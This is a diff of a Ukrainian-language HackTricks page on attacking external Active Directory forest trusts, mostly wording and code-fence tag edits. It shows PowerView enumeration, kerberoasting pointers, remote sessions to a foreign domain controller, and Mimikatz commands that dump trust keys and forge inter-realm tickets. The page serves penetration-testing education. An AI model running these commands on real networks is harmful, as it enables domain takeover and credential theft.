@@ -1,4 +1,4 @@
-# Зовнішній лісовий домен - односторонній (вхідний) або двосторонній
+# Зовнішній ліс домену - односторонній (вхідний) або двосторонній
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -7,7 +7,7 @@
 ## Перерахування
 
 Перш за все, вам потрібно **перерахувати** **довіру**:
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -56,14 +56,14 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-У попередній енумерації було виявлено, що користувач **`crossuser`** знаходиться в групі **`External Admins`**, яка має **адміністративний доступ** в **DC зовнішнього домену**.
+У попередній нумерації було виявлено, що користувач **`crossuser`** знаходиться в групі **`External Admins`**, яка має **адміністративний доступ** в **DC зовнішнього домену**.
 
 ## Початковий доступ
 
-Якщо ви **не змогли** знайти жодного **спеціального** доступу вашого користувача в іншому домені, ви все ще можете повернутися до методології AD і спробувати **підвищити привілеї з непривабливого користувача** (такі речі, як керберостинг, наприклад):
+Якщо ви **не змогли** знайти жодного **спеціального** доступу вашого користувача в іншому домені, ви все ще можете повернутися до методології AD і спробувати **підвищити привілеї з непривабливого користувача** (такі речі, як kerberoasting, наприклад):
 
-Ви можете використовувати **функції Powerview** для **енумерації** **іншого домену** за допомогою параметра `-Domain`, як у:
-```powershell
+Ви можете використовувати **функції Powerview** для **перерахунку** **іншого домену** за допомогою параметра `-Domain`, як у:
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,7 +75,7 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### Увійти
 
 Використовуючи звичайний метод з обліковими даними користувачів, які мають доступ до зовнішнього домену, ви повинні мати можливість отримати доступ до:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### Зловживання SID Історією
@@ -85,13 +85,13 @@ Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\admini
 Якщо користувача **мігрують з одного лісу в інший** і **фільтрація SID не ввімкнена**, стає можливим **додати SID з іншого лісу**, і цей **SID** буде **додано** до **токена користувача** під час автентифікації **через довірчий зв'язок**.
 
 > [!WARNING]
-> Нагадаємо, що ви можете отримати ключ підпису за допомогою
+> Нагадаємо, ви можете отримати ключ підпису за допомогою
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Ви можете **підписати** **довіреним** ключем **TGT, що імплементує** користувача поточного домену.
+Ви можете **підписати** з **достовірним** ключем **TGT, що імплементує** користувача поточного домену.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
